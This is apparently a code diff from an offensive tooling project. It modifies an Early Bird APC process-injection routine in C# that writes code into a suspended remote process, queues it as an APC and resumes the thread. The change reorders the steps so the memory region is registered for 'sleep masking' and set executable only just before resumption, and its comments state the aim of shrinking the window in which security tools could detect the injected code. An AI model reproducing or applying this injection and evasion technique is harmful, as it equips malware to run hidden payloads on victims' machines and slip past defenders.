@@ -112,21 +112,21 @@ namespace Injection.Techniques.EarlyBird
                     bRet = _pWriteProcessMemory(_hProcess, allocSpace, _code, (uint)_code.Length, out bytesWritten);
                     if (bRet)
                     {
-                        //Marshal.Copy(pic, 0, allocSpace, pic.Length);
-                        uint flOldProtect = 0;
-                        if (!_pVirtualProtectEx(_hProcess, allocSpace, (uint)_code.Length, (uint)MemoryProtection.ExecuteRead, out flOldProtect))
+                        // Queue APC while memory is still RW
+                        if (!_pQUAPC(allocSpace, hThread, IntPtr.Zero))
+                        {
                             bRet = false;
+                        }
                         else
                         {
-                            //var argumentPointer = Marshal.StringToHGlobalAnsi(arguments);
-                            if (!_pQUAPC(allocSpace, hThread, IntPtr.Zero))
-                                bRet = false;
-                            else
-                            {
-                                _pResumeThread(hThread);
-                                RegisterSleepMaskRegion(allocSpace, _code.Length);
-                                bRet = true;
-                            }
+                            // Register for sleep masking before the thread resumes
+                            RegisterSleepMaskRegion(allocSpace, _code.Length);
+
+                            // Now flip to RX and resume - minimal exposure window
+                            uint flOldProtect = 0;
+                            _pVirtualProtectEx(_hProcess, allocSpace, (uint)_code.Length, (uint)MemoryProtection.ExecuteRead, out flOldProtect);
+                            _pResumeThread(hThread);
+                            bRet = true;
                         }
                     }
                 }
